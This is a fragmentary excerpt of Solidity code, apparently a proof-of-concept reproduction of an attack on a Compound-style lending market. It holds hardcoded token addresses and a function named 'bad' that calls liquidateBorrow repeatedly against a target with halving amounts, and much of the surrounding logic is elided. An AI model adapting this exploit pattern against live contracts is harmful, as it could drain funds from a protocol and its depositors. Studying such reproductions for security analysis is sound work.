...
contract OO{
    ...
    address cBAO = 0x132E549262f2b2AD48AA306c3d389e55BB510419;
    address BAO = 0x374CB8C27130E2c9E04F44303f3c8351B9De61C1;
    ...
    function st() public {
        ...
        ERC20(BAO).approve(cBAO, type(uint256).max);
    }
    ...
    function bad() public{
        ...
        CTOKEN(CZH).liquidateBorrow(TARGET, 788*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 394*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 197*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 98*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 49*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 24*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 12*1e18, COM);
        CTOKEN(CZH).liquidateBorrow(TARGET, 6*1e18, COM);
        CTOKEN(cBAO).liquidateBorrow(TARGET, 644000*1e18, COM);
        CTOKEN(cBAO).liquidateBorrow(TARGET, 322000*1e18, COM);
        CTOKEN(cBAO).liquidateBorrow(TARGET, 161000*1e18, COM);
        CTOKEN(cBAO).liquidateBorrow(TARGET, 80000*1e18, COM);
        CTOKEN(cBAO).liquidateBorrow(TARGET, 40000*1e18, COM);
        console.log("aa",ERC20(COM).balanceOf(address(this)));
    }
